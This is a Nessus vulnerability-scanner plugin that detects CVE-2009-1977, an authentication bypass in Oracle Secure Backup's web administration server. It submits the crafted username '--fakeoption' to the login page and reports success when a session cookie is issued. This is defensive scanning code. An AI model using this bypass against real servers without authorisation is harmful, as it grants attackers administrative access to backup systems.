#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(40989);
  script_version("$Revision: 1.19 $");
  script_cvs_date("$Date: 2016/12/07 21:18:28 $");

  script_cve_id("CVE-2009-1977");
  script_bugtraq_id(35672);
  script_osvdb_id(55903);
  script_xref(name:"EDB-ID", value:"9652");

  script_name(english:"Oracle Secure Backup Administration Server Authentication Bypass");
  script_summary(english:"Tries to generate a SQL error");

  script_set_attribute( attribute:"synopsis", value:
"The remote web server contains a PHP application that allows an
attacker to bypass authentication."  );
  script_set_attribute( attribute:"description",  value:
"The remote web server is the Administration Server for Oracle Secure
Backup, a centralized tape backup management software application.

The installed version of Oracle Secure Backup allows a remote attacker
to bypass authentication using a specially crafted username, such as
'--fakeoption'.

An unauthenticated, remote attacker can leverage this issue to bypass
authentication and gain administrative access to the application.
Under Windows, this can lead to a complete system compromise.

Note that this install is also likely to be affected by multiple
command injection vulnerabilities, although Nessus has not checked for
them."  );
  script_set_attribute( attribute:"see_also",  value:
"http://www.zerodayinitiative.com/advisories/ZDI-09-058/"  );
  script_set_attribute( attribute:"see_also",  value:
"http://seclists.org/fulldisclosure/2009/Aug/249"  );
  script_set_attribute( attribute:"see_also",  value:
"http://www.oracle.com/technetwork/topics/security/cpujul2009-091332.html"  );
  script_set_attribute( attribute:"solution",  value:
"Upgrade to Oracle Secure Backup version 10.2.0.3 or later."  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Oracle Secure Backup 10.3.0.1 RCE");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
script_set_attribute(attribute:"cpe",value:"cpe:/a:oracle:secure_backup");
  script_set_attribute(
    attribute:"vuln_publication_date", 
    value:"2009/08/18"
  );
  script_set_attribute(
    attribute:"patch_publication_date", 
    value:"2009/07/14"
  );
  script_set_attribute(
    attribute:"plugin_publication_date", 
    value:"2009/09/14"
  );
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 443);
  script_require_keys("www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:443);
if (!can_host_php(port:port)) exit(0, "Web server does not support PHP scripts.");


# nb: the username can be anything starting with '--'.
#     and the password can be anything.
user = "--fakeoption";
pass = "NESSUS";


# Make sure the affected script exists.
url = "/login.php";

res = http_send_recv3(port:port, method:"GET", item:url);
if (isnull(res)) exit(1, "The web server failed to respond.");

if (
  "<title>Oracle Secure Backup Web Interface</title>" >< res[2] &&
  '<input name="uname" ' >< res[2]
)
{
  postdata = string(
    "button=Login&",
    "attempt=1&",
    "mode=&",
    "tab=&",
    "uname=", user, "&",
    "passwd=", pass
  );

  req = http_mk_post_req(
    port        : port,
    item        : url, 
    data        : postdata,
    content_type: "application/x-www-form-urlencoded"
  );
  res = http_send_recv_req(port:port, req:req, exit_on_fail: 1);

  hdrs = parse_http_headers(status_line:res[0], headers:res[1]);
  if (isnull(hdrs['$code'])) code = 0;
  else code = hdrs['$code'];

  if (isnull(hdrs['set-cookie'])) cookies = "";
  else cookies = hdrs['set-cookie'];

  if (isnull(hdrs['location'])) location = "";
  else location = hdrs['location'];

  # There's a problem if ...
  if (
    # we're redirected and ...
    code == 302 &&
    "/index.php?tab=&mode=" >< location &&
    # a session cookie was set.
    "PHPSESSID=" >< cookies
  )
  {
    if (report_verbosity > 0)
    {
      req_str = http_mk_buffer_from_req(req:req);

      report = string(
        "\n",
        "Nessus was able to gain access using the following credentials :\n",
        "\n",
        "  URL      : ", build_url(port:port, qs:url), "\n",
        "  User     : ", user, "\n",
        "  Password : ", pass, "\n"
      );
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
    exit(0);
  }
}
